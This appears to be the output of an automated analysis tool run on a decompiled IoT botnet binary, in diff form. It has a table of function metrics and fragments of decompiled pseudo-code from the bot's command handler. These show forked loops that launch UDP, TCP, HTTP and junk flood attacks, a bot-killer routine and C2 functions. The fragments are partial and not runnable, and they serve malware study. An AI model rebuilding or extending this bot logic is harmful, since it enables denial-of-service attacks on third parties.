+readUntil                                         |8   |598     |5             |87          |
+----------------------------------------------------------------------------------------------
+__uClibc_main                                     |7   |844     |5             |18          |
+----------------------------------------------------------------------------------------------
+__GI_inet_ntop                                    |4   |854     |5             |267         |
+----------------------------------------------------------------------------------------------
+botkiller                                         |0   |527     |5             |0           |
+----------------------------------------------------------------------------------------------
+recvLine                                          |3   |601     |5             |72          |
+----------------------------------------------------------------------------------------------
+StartTheNetis                                     |0   |515     |4             |0           |
+----------------------------------------------------------------------------------------------
+connectTimeout                                    |4   |555     |4             |18          |
+----------------------------------------------------------------------------------------------
+socket_connect                                    |2   |516     |4             |0           |
+----------------------------------------------------------------------------------------------
+_load_inttype                                     |3   |549     |4             |0           |
+----------------------------------------------------------------------------------------------
+inet_pton                                         |3   |791     |4             |122         |
+----------------------------------------------------------------------------------------------
+strstr                                            |2   |634     |3             |110         |
+----------------------------------------------------------------------------------------------
+sleep                                             |1   |588     |3             |0           |
+----------------------------------------------------------------------------------------------
+sendSTD                                           |3   |519     |3             |0           |
+----------------------------------------------------------------------------------------------
+strnlen                                           |2   |602     |3             |92          |
+----------------------------------------------------------------------------------------------
+__GI_memchr                                       |3   |601     |3             |79          |
+----------------------------------------------------------------------------------------------
+listFork                                          |0   |533     |3             |10          |
+----------------------------------------------------------------------------------------------
+negotiate                                         |3   |546     |3             |0           |
+----------------------------------------------------------------------------------------------
+__GI_herror                                       |1   |558     |3             |0           |
+----------------------------------------------------------------------------------------------
+initConnection                                    |0   |543     |3             |0           |
+----------------------------------------------------------------------------------------------
+memrchr                                           |3   |598     |3             |89          |
+----------------------------------------------------------------------------------------------
+srandom_r                                         |2   |560     |3             |35          |
+----------------------------------------------------------------------------------------------
+print                                             |3   |704     |2             |183         |
+----------------------------------------------------------------------------------------------
+_stdio_term                                       |0   |553     |2             |36          |
+----------------------------------------------------------------------------------------------
+inet_aton                                         |1   |596     |2             |74          |
+----------------------------------------------------------------------------------------------
+_store_inttype                                    |4   |528     |2             |0           |
+----------------------------------------------------------------------------------------------
+HackerPrint                                       |2   |511     |2             |0           |
+----------------------------------------------------------------------------------------------
+__GI_initstate_r                                  |4   |543     |2             |0           |
+----------------------------------------------------------------------------------------------
+makeRandomStr                                     |2   |517     |2             |0           |
+----------------------------------------------------------------------------------------------
+_stdlib_strto_l                                   |1   |1288    |2             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fclose                                       |1   |561     |2             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strncat                                      |3   |592     |2             |63          |
+----------------------------------------------------------------------------------------------
+__length_dotted                                   |0   |543     |2             |30          |
+----------------------------------------------------------------------------------------------
+read_with_timeout                                 |4   |524     |2             |12          |
+----------------------------------------------------------------------------------------------
+_stdio_openlist_dec_use                           |0   |565     |2             |34          |
+----------------------------------------------------------------------------------------------
+strncpy                                           |3   |594     |2             |28          |
+----------------------------------------------------------------------------------------------
+__libc_recv                                       |5   |516     |2             |0           |
+----------------------------------------------------------------------------------------------
+hostname_to_ip                                    |2   |520     |2             |0           |
+----------------------------------------------------------------------------------------------
+__raise                                           |1   |507     |2             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strpbrk                                      |0   |556     |2             |43          |
+----------------------------------------------------------------------------------------------
+printi                                            |7   |596     |2             |28          |
+----------------------------------------------------------------------------------------------
+__libc_system                                     |1   |545     |2             |0           |
+----------------------------------------------------------------------------------------------
+__xpg_strerror_r                                  |0   |583     |2             |77          |
+----------------------------------------------------------------------------------------------
+__libc_sendto                                     |6   |516     |2             |0           |
+----------------------------------------------------------------------------------------------
+_uintmaxtostr                                     |3   |610     |2             |44          |
+----------------------------------------------------------------------------------------------
+_ppfs_init                                        |1   |578     |2             |40          |
+----------------------------------------------------------------------------------------------
+__GI_strchr                                       |2   |599     |2             |33          |
+----------------------------------------------------------------------------------------------
+__GI_fgets_unlocked                               |3   |571     |2             |49          |
+----------------------------------------------------------------------------------------------
+rawmemchr                                         |2   |573     |2             |27          |
+----------------------------------------------------------------------------------------------
+abort                                             |0   |683     |2             |0           |
+----------------------------------------------------------------------------------------------
+__open_etc_hosts                                  |0   |518     |2             |0           |
+----------------------------------------------------------------------------------------------
+contains_string                                   |2   |531     |2             |14          |
+----------------------------------------------------------------------------------------------
+__GI_strlen                                       |0   |570     |2             |25          |
+----------------------------------------------------------------------------------------------
+__libc_send                                       |4   |516     |2             |0           |
+----------------------------------------------------------------------------------------------
+matchPrompt                                       |1   |564     |2             |55          |
+----------------------------------------------------------------------------------------------
+__decode_dotted                                   |2   |575     |1             |51          |
+----------------------------------------------------------------------------------------------
+_charpad                                          |3   |529     |1             |16          |
+----------------------------------------------------------------------------------------------
+memcpy                                            |0   |765     |1             |91          |
+----------------------------------------------------------------------------------------------
+isatty                                            |1   |506     |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strcoll                                      |2   |528     |1             |18          |
+----------------------------------------------------------------------------------------------
+trim                                              |1   |536     |1             |22          |
+----------------------------------------------------------------------------------------------
+__GI_snprintf                                     |6   |505     |1             |0           |
+----------------------------------------------------------------------------------------------
+parseHex                                          |1   |527     |1             |17          |
+----------------------------------------------------------------------------------------------
+__encode_dotted                                   |1   |565     |1             |48          |
+----------------------------------------------------------------------------------------------
+__get_hosts_byname_r                              |7   |508     |1             |0           |
+----------------------------------------------------------------------------------------------
+tcpcsum                                           |2   |512     |1             |0           |
+----------------------------------------------------------------------------------------------
+sprintf                                           |2   |506     |1             |0           |
+----------------------------------------------------------------------------------------------
+inet_ntoa_r                                       |1   |526     |1             |18          |
+----------------------------------------------------------------------------------------------
+sigprocmask                                       |0   |528     |1             |0           |
+----------------------------------------------------------------------------------------------
+_ppfs_setargs                                     |0   |648     |1             |92          |
+----------------------------------------------------------------------------------------------
+kill                                              |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+__heap_alloc                                      |2   |557     |1             |38          |
+----------------------------------------------------------------------------------------------
+__GI_strcasecmp                                   |1   |539     |1             |30          |
+----------------------------------------------------------------------------------------------
+getdtablesize                                     |0   |515     |1             |0           |
+----------------------------------------------------------------------------------------------
+getegid                                           |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+get_telstate_host                                 |1   |507     |1             |0           |
+----------------------------------------------------------------------------------------------
+__vfork                                           |0   |506     |1             |0           |
+----------------------------------------------------------------------------------------------
+getHost                                           |2   |507     |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_getpid                                     |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+geteuid                                           |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+getrlimit                                         |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_setsockopt                                   |5   |516     |1             |0           |
+----------------------------------------------------------------------------------------------
+rand                                              |0   |506     |1             |0           |
+----------------------------------------------------------------------------------------------
+_promoted_size                                    |1   |527     |1             |15          |
+----------------------------------------------------------------------------------------------
+fgets                                             |3   |522     |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_inet_ntoa                                    |1   |506     |1             |0           |
+----------------------------------------------------------------------------------------------
+makeIPPacket                                      |4   |508     |1             |0           |
+----------------------------------------------------------------------------------------------
+inet_pton4                                        |1   |587     |1             |65          |
+----------------------------------------------------------------------------------------------
+__libc_close                                      |1   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_vsnprintf                                    |1   |519     |1             |0           |
+----------------------------------------------------------------------------------------------
+prints                                            |4   |612     |1             |13          |
+----------------------------------------------------------------------------------------------
+fflush_unlocked                                   |1   |599     |1             |52          |
+----------------------------------------------------------------------------------------------
+__libc_waitpid                                    |3   |506     |1             |0           |
+----------------------------------------------------------------------------------------------
+HackerScan                                        |1   |507     |1             |0           |
+----------------------------------------------------------------------------------------------
+inet_ntop4                                        |3   |555     |1             |45          |
+----------------------------------------------------------------------------------------------
+__stdio_WRITE                                     |2   |581     |1             |26          |
+----------------------------------------------------------------------------------------------
+free                                              |0   |577     |1             |0           |
+----------------------------------------------------------------------------------------------
+socket                                            |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+fdgets                                            |3   |533     |1             |22          |
+----------------------------------------------------------------------------------------------
+__GI_fopen                                        |2   |506     |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_getsockname                                  |4   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_fork                                       |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_open                                       |2   |522     |1             |0           |
+----------------------------------------------------------------------------------------------
+_stdio_fopen                                      |2   |665     |1             |0           |
+----------------------------------------------------------------------------------------------
+inet_addr                                         |1   |513     |1             |0           |
+----------------------------------------------------------------------------------------------
+wait4                                             |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+strcasestr                                        |2   |540     |1             |31          |
+----------------------------------------------------------------------------------------------
+__libc_creat                                      |1   |506     |1             |0           |
+----------------------------------------------------------------------------------------------
+__check_one_fd                                    |2   |521     |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_wcsnrtombs                                   |0   |609     |1             |31          |
+----------------------------------------------------------------------------------------------
+fprintf                                           |5   |505     |1             |0           |
+----------------------------------------------------------------------------------------------
+random                                            |0   |513     |1             |0           |
+----------------------------------------------------------------------------------------------
+getsockopt                                        |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_connect                                    |4   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+LoopPayload                                       |0   |507     |1             |0           |
+----------------------------------------------------------------------------------------------
+sclose                                            |1   |507     |1             |0           |
+----------------------------------------------------------------------------------------------
+srand                                             |1   |511     |1             |0           |
+----------------------------------------------------------------------------------------------
+getuid                                            |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+getgid                                            |0   |517     |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strspn                                       |1   |554     |1             |44          |
+----------------------------------------------------------------------------------------------
+malloc                                            |1   |591     |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_gethostbyname                                |1   |508     |1             |0           |
+----------------------------------------------------------------------------------------------
+_fp_out_narrow                                    |4   |560     |0             |0           |
+----------------------------------------------------------------------------------------------
+__uClibc_init                                     |0   |527     |0             |0           |
+----------------------------------------------------------------------------------------------
+_stdio_init                                       |0   |510     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_wcrtomb                                      |3   |518     |0             |0           |
+----------------------------------------------------------------------------------------------
+_ppfs_prepargs                                    |1   |514     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fseek                                        |2   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+ntohs                                             |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+uppercase                                         |1   |518     |0             |0           |
+----------------------------------------------------------------------------------------------
+ioctl                                             |0   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+unknown_0                                         |0   |0       |0             |0           |
+----------------------------------------------------------------------------------------------
+execl                                             |5   |536     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI___h_errno_location                           |0   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__sigismember                                     |2   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+strtok_r                                          |1   |528     |0             |0           |
+----------------------------------------------------------------------------------------------
+szprintf                                          |3   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_memset                                       |3   |637     |0             |0           |
+----------------------------------------------------------------------------------------------
+__encode_header                                   |3   |515     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_fcntl                                      |2   |523     |0             |0           |
+----------------------------------------------------------------------------------------------
+setstate_r                                        |2   |538     |0             |0           |
+----------------------------------------------------------------------------------------------
+getc_unlocked                                     |0   |704     |0             |0           |
+----------------------------------------------------------------------------------------------
+hstrerror                                         |1   |513     |0             |0           |
+----------------------------------------------------------------------------------------------
+bcopy                                             |3   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__length_question                                 |0   |515     |0             |0           |
+----------------------------------------------------------------------------------------------
+__start                                           |1   |509     |0             |0           |
+----------------------------------------------------------------------------------------------
+initstate                                         |3   |512     |0             |0           |
+----------------------------------------------------------------------------------------------
+__syscall_error                                   |1   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+access                                            |0   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+_exit                                             |1   |519     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_READ                                      |2   |529     |0             |0           |
+----------------------------------------------------------------------------------------------
+_fini                                             |0   |509     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_nanosleep                                  |3   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+strcpy                                            |2   |519     |0             |0           |
+----------------------------------------------------------------------------------------------
+__heap_link_free_area_after                       |3   |513     |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_return_0                                |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_toupper                                      |1   |516     |0             |0           |
+----------------------------------------------------------------------------------------------
+atol                                              |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+sigemptyset                                       |1   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+setstate                                          |1   |512     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_read                                       |1   |520     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_vfprintf                                     |1   |543     |0             |0           |
+----------------------------------------------------------------------------------------------
+htons                                             |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strtok                                       |2   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_seek                                      |3   |514     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_setsid                                       |1   |516     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_sigaction                                  |3   |523     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fwrite_unlocked                              |4   |579     |0             |0           |
+----------------------------------------------------------------------------------------------
+__do_global_ctors_aux                             |0   |522     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_trans2w_o                                 |2   |601     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_brk                                          |1   |513     |0             |0           |
+----------------------------------------------------------------------------------------------
+contains_fail                                     |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fseeko64                                     |2   |634     |0             |0           |
+----------------------------------------------------------------------------------------------
+contains_success                                  |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+read_until_response                               |4   |514     |0             |0           |
+----------------------------------------------------------------------------------------------
+init_rand                                         |1   |508     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_sbrk                                         |1   |557     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_tcgetattr                                    |1   |515     |0             |0           |
+----------------------------------------------------------------------------------------------
+__bsd_signal                                      |2   |588     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fputs_unlocked                               |2   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_mempcpy                                      |4   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+__decode_header                                   |2   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+dup2                                              |0   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+chdir                                             |0   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+__sigaddset                                       |0   |511     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_write                                      |2   |519     |0             |0           |
+----------------------------------------------------------------------------------------------
+__errno_location                                  |0   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_execve                                       |2   |523     |0             |0           |
+----------------------------------------------------------------------------------------------
+ntohl                                             |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__syscall_rt_sigaction                            |3   |519     |0             |0           |
+----------------------------------------------------------------------------------------------
+strtol                                            |2   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+frame_dummy                                       |0   |520     |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_return_void                             |2   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+__encode_question                                 |3   |522     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strdup                                       |0   |515     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_wcsrtombs                                    |2   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+bzero                                             |2   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_tolower                                      |1   |516     |0             |0           |
+----------------------------------------------------------------------------------------------
+wildString                                        |2   |664     |0             |0           |
+----------------------------------------------------------------------------------------------
+_dl_aux_init                                      |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_poll                                       |4   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+__sigdelset                                       |2   |508     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_lseek64                                    |3   |511     |0             |0           |
+----------------------------------------------------------------------------------------------
+printchar                                         |2   |511     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_trans2r_o                                 |1   |576     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_wcommit                                   |0   |519     |0             |0           |
+----------------------------------------------------------------------------------------------
+getBuild                                          |0   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+__do_global_dtors_aux                             |0   |546     |0             |0           |
+----------------------------------------------------------------------------------------------
+prctl                                             |0   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+exit                                              |1   |526     |0             |0           |
+----------------------------------------------------------------------------------------------
+htonl                                             |1   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI___glibc_strerror_r                           |3   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_rfill                                     |1   |508     |0             |0           |
+----------------------------------------------------------------------------------------------
+csum                                              |2   |549     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_time                                         |1   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_sigaddset                                    |2   |519     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_select                                     |5   |516     |0             |0           |
+----------------------------------------------------------------------------------------------
+__heap_free                                       |3   |621     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_fwrite                                    |3   |597     |0             |0           |
+----------------------------------------------------------------------------------------------
+__decode_answer                                   |4   |536     |0             |0           |
+----------------------------------------------------------------------------------------------
+__heap_link_free_area                             |4   |518     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_init_mutex                                |0   |506     |0             |0           |
+----------------------------------------------------------------------------------------------
+isspace                                           |1   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+zprintf                                           |4   |507     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fcntl64                                      |0   |517     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI___uClibc_fini                                |0   |529     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_random_r                                     |2   |530     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_pipe                                         |1   |516     |0             |0           |
+----------------------------------------------------------------------------------------------
+rand_cmwc                                         |0   |529     |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_adjust_position                           |2   |981     |0             |0           |
+----------------------------------------------------------------------------------------------
+================================================================================
+========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
+================================================================================
+=================FUNCTION : processCmd ===================
+++++++++ FUNCTION START 43849
+++++++++ FUNCTION END 46519
+++++++++ FUNCTION LENGTH 2670
+        HackerPrint(*(int32_t *)&v483, (int32_t)&v484);
+        __GI_inet_ntoa(*(int32_t *)&v486);
+        HackerPrint(*(int32_t *)&v483, (int32_t)&v487);
+        if (listFork() == 0) {
+            HackerPrint(*(int32_t *)&v483, (int32_t)&v489);
+            botkiller();
+        if (listFork() == 0) {
+            HackerPrint(*(int32_t *)&v483, (int32_t)&v493);
+            HackerPrint(*(int32_t *)&v483, (int32_t)&v585);
+            kill();
+            HackerPrint(*(int32_t *)&v483, (int32_t)&v589);
+                int32_t v591 = __libc_fork(); // 0x40ea54
+                        HackerPrint(*(int32_t *)&v483, (int32_t)&v496);
+                        StartTheNetis();
+                                    while (true) {
+                                        if (listFork() == 0) {
+                                            sendHOLD(v602, v529, v530);
+                                    result = listFork();
+                                    sendHOLD(v528, v529, v530);
+                                result = listFork();
+                                    sendHOLD(v528, v529, v530);
+                                    while (true) {
+                                        if (listFork() == 0) {
+                                            sendJUNK(v605, v532, v533);
+                                            __libc_close(*(int32_t *)&v483);
+                                    result2 = listFork();
+                                    sendJUNK(v531, v532, v533);
+                                result2 = listFork();
+                                    sendJUNK(v531, v532, v533);
+                                                        while (true) {
+                                                            if (listFork() == 0) {
+                                                                sendUDP(v609, v536, v537, v538, v539, 10);
+                                                        result3 = listFork();
+                                                        sendUDP(v535, v536, v537, v538, v539, 10);
+                                                    result3 = listFork();
+                                                        sendUDP(v535, v536, v537, v538, v539, 10);
+                                while (true) {
+                                    if (listFork() == 0) {
+                                        sendHTTP(*v517, v541, (int16_t)(v543 % 0x10000), v544, v546, v548);
+                                result4 = listFork();
+                                sendHTTP(*v517, v549, (int16_t)(v551 % 0x10000), v552, v554, v556);
+                            result4 = listFork();
+                                sendHTTP(*v517, v549, (int16_t)(v551 % 0x10000), v552, v554, v556);
+                                    while (true) {
+                                        if (listFork() == 0) {
+                                            sendCNC(v611, v558, v559);
+                                            __libc_close(*(int32_t *)&v483);
+                                    result5 = listFork();
+                                    sendCNC(v557, v558, v559);
+                                result5 = listFork();
+                                    sendCNC(v557, v558, v559);
+                                    while (true) {
+                                        if (listFork() == 0) {
+                                            sendJUNK(v504, v561, v562);
+                                            sendSTD(v504, v561, v562);
+                                            sendHOLD(v504, v561, v562);
+                                            __libc_close(*(int32_t *)&v483);
+                                    result6 = listFork();
+                                    sendJUNK(v560, v561, v562);
+                                    sendSTD(v560, v561, v562);
+                                    sendHOLD(v560, v561, v562);
+                                result6 = listFork();
+                                    sendJUNK(v560, v561, v562);
+                                    sendSTD(v560, v561, v562);
+                                    sendHOLD(v560, v561, v562);
+                                    while (true) {
+                                        if (listFork() == 0) {
+                                            sendSTD(v614, v564, v565);
+                                    result7 = listFork();
+                                    sendSTD(v563, v564, v565);
+                                result7 = listFork();
+                                    sendSTD(v563, v564, v565);
+                                                while (true) {
+                                                    if (listFork() == 0) {
+                                                        sendTCP(v616, v508, v569, v570, v571, 0, 10);
+                                                result9 = listFork();
+                                                sendTCP(v568, v508, v569, v570, v571, 0, 10);
+                                            result9 = listFork();
+                                                sendTCP(v568, v508, v569, v570, v571, 0, 10);
+                            while (true) {
+                                        kill();
+                                while (true) {
+                                    if (listFork() != 0) {
+                                    sendHOLD(v575, v529, v530);
+                            if (listFork() == 0) {
+                                sendHOLD(v528, v529, v530);
+                                    while (true) {
+                                        if (listFork() != 0) {
+                                        sendJUNK(v576, v532, v533);
+                                        __libc_close(*(int32_t *)&v483);
+                                if (listFork() == 0) {
+                                    sendJUNK(v531, v532, v533);
+                                                            while (true) {
+                                                                if (listFork() != 0) {
+                                                                sendUDP(v577, v536, v537, v538, v539, 10);
+                                                        if (listFork() == 0) {
+                                                            sendUDP(v535, v536, v537, v538, v539, 10);
+                                                while (true) {
+                                                    if (listFork() != 0) {
+                                                    sendCNC(v578, v558, v559);
+                                                    __libc_close(*(int32_t *)&v483);
+                                            result5 = listFork();
+                                                sendCNC(v557, v558, v559);
+                                                while (true) {
+                                                    if (listFork() != 0) {
+                                                    sendJUNK(v504, v561, v562);
+                                                    sendSTD(v504, v561, v562);
+                                                    sendHOLD(v504, v561, v562);
+                                                    __libc_close(*(int32_t *)&v483);
+                                            result6 = listFork();
+                                                sendJUNK(v560, v561, v562);
+                                                sendSTD(v560, v561, v562);
+                                                sendHOLD(v560, v561, v562);
+                                                while (true) {
+                                                    if (listFork() != 0) {
+                                                    sendSTD(v579, v564, v565);
+                                            result7 = listFork();
+                                                sendSTD(v563, v564, v565);
+                                                            while (true) {
+                                                                if (listFork() != 0) {
+                                                                sendTCP(v584, v508, v569, v570, v571, 0, 10);
+                                                        result9 = listFork();
+                                                            sendTCP(v568, v508, v569, v570, v571, 0, 10);
+                                        while (true) {
+                                    while (true) {
+                                        if (listFork() != 0) {
+                                        sendHTTP(*v517, v541, (int16_t)(v543 % 0x10000), v544, v546, v548);
+                                if (listFork() == 0) {
+                                    sendHTTP(*v517, v549, (int16_t)(v551 % 0x10000), v552, v554, v556);
+                    HackerPrint(*(int32_t *)&v483, (int32_t)&v496);
+                    StartTheNetis();
+                                while (true) {
+                                    if (listFork() != 0) {
+                                    sendHOLD(v575, v529, v530);
+                            if (listFork() == 0) {
+                                sendHOLD(v528, v529, v530);
+                                    while (true) {
+                                        if (listFork() != 0) {
+                                        sendJUNK(v576, v532, v533);
+                                        __libc_close(*(int32_t *)&v483);
+                                if (listFork() == 0) {
+                                    sendJUNK(v531, v532, v533);
+                                                            while (true) {
+                                                                if (listFork() != 0) {
+                                                                sendUDP(v577, v536, v537, v538, v539, 10);
+                                                        if (listFork() == 0) {
+                                                            sendUDP(v535, v536, v537, v538, v539, 10);
+                                        while (true) {
+                                            if (listFork() != 0) {
+                                            sendHTTP(*v517, v541, (int16_t)(v543 % 0x10000), v544, v546, v548);
+                                    if (listFork() == 0) {
+                                        sendHTTP(*v517, v549, (int16_t)(v551 % 0x10000), v552, v554, v556);
+                                                while (true) {
+                                                    if (listFork() != 0) {
+                                                    sendCNC(v578, v558, v559);
+                                                    __libc_close(*(int32_t *)&v483);
+                                            if (listFork() == 0) {
+                                                sendCNC(v557, v558, v559);
+                                                    while (true) {
+                                                        if (listFork() != 0) {
+                                                        sendJUNK(v504, v561, v562);
+                                                        sendSTD(v504, v561, v562);
+                                                        sendHOLD(v504, v561, v562);
+                                                        __libc_close(*(int32_t *)&v483);
+                                                if (listFork() == 0) {
+                                                    sendJUNK(v560, v561, v562);
+                                                    sendSTD(v560, v561, v562);
+                                                    sendHOLD(v560, v561, v562);
+                                                        while (true) {
+                                                            if (listFork() != 0) {
+                                                            sendSTD(v579, v564, v565);
+                                                    if (listFork() == 0) {
+                                                        sendSTD(v563, v564, v565);
+                                                                        while (true) {
+                                                                            if (listFork() != 0) {
+                                                                            sendTCP(v584, v508, v569, v570, v571, 0, 10);
+                                                                    if (listFork() == 0) {
+                                                                        sendTCP(v568, v508, v569, v570, v571, 0, 10);
+                                                    while (true) {
+                            while (true) {
+                                if (listFork() != 0) {
+                                sendHOLD(v575, v529, v530);
+                        if (listFork() == 0) {
+                            sendHOLD(v528, v529, v530);
+                                while (true) {
+                                    if (listFork() != 0) {
+                                    sendJUNK(v576, v532, v533);
+                                    __libc_close(*(int32_t *)&v483);
+                            if (listFork() == 0) {
+                                sendJUNK(v531, v532, v533);
+                                                        while (true) {
+                                                            if (listFork() != 0) {
+                                                            sendUDP(v577, v536, v537, v538, v539, 10);
+                                                    if (listFork() == 0) {
+                                                        sendUDP(v535, v536, v537, v538, v539, 10);
+                                    while (true) {
+                                        if (listFork() != 0) {
+                                        sendHTTP(*v517, v541, (int16_t)(v543 % 0x10000), v544, v546, v548);
+                                if (listFork() == 0) {
+                                    sendHTTP(*v517, v549, (int16_t)(v551 % 0x10000), v552, v554, v556);
+                                            while (true) {
+                                                if (listFork() != 0) {
+                                                sendCNC(v578, v558, v559);
+                                                __libc_close(*(int32_t *)&v483);
+                                        if (listFork() == 0) {
+                                            sendCNC(v557, v558, v559);
+                                                while (true) {
+                                                    if (listFork() != 0) {
+                                                    sendJUNK(v504, v561, v562);
+                                                    sendSTD(v504, v561, v562);
+                                                    sendHOLD(v504, v561, v562);
+                                                    __libc_close(*(int32_t *)&v483);
+                                            if (listFork() == 0) {
+                                                sendJUNK(v560, v561, v562);
+                                                sendSTD(v560, v561, v562);
+                                                sendHOLD(v560, v561, v562);
+                                                    while (true) {
+                                                        if (listFork() != 0) {
+                                                        sendSTD(v579, v564, v565);
+                                                if (listFork() == 0) {
+                                                    sendSTD(v563, v564, v565);
+                                                                    while (true) {
+                                                                        if (listFork() != 0) {
+                                                                        sendTCP(v584, v508, v569, v570, v571, 0, 10);
+                                                                if (listFork() == 0) {
+                                                                    sendTCP(v568, v508, v569, v570, v571, 0, 10);
+                                                while (true) {
+=================FUNCTION : gethostbyname_r ===================
+++++++++ FUNCTION START 97568
+++++++++ FUNCTION END 98547
+++++++++ FUNCTION LENGTH 979
+    int32_t v502 = __get_hosts_byname_r(a1, 2, v501, a3, a4, a5, a6); // 0x4150d4
+                    if (inet_aton((char *)a1) != 0) {
+                    __open_nameservers();
+                    v525 = __dns_lookup((char *)a1, 1, v521, v522, (int32_t)&v508, v519);
+                        free();
+                        free();
+                    free();
+                        free();
+                    free();
+                if (inet_aton((char *)a1) != 0) {
+                __open_nameservers();
+                v525 = __dns_lookup((char *)a1, 1, v521, v522, (int32_t)&v508, v519);
+                    free();
+                    free();
+                free();
+                    free();
+                free();
+                        if (inet_aton((char *)a1) != 0) {
+                        __open_nameservers();
+                        v525 = __dns_lookup((char *)a1, 1, v521, v522, (int32_t)&v508, v519);
+                            free();
+                            free();
+                        free();
+                            free();
+                        free();
+                            if (inet_aton((char *)a1) != 0) {
+                            __open_nameservers();
+                            v525 = __dns_lookup((char *)a1, 1, v521, v522, (int32_t)&v508, v519);
+                                free();
+                                free();
+                            free();
+                                free();
+                            free();
+                            if (inet_aton((char *)a1) != 0) {
+                            __open_nameservers();
+                            v525 = __dns_lookup((char *)a1, 1, v521, v522, (int32_t)&v508, v519);
+                                free();
+                                free();
+                            free();
+                                free();
+                            free();
+                                if (inet_aton((char *)a1) != 0) {
+                                __open_nameservers();
+                                v525 = __dns_lookup((char *)a1, 1, v521, v522, (int32_t)&v508, v519);
+                                    free();
+                                    free();
+                                free();
+                                    free();
+                                free();
+=================FUNCTION : _init ===================
+++++++++ FUNCTION START 317
+++++++++ FUNCTION END 1068
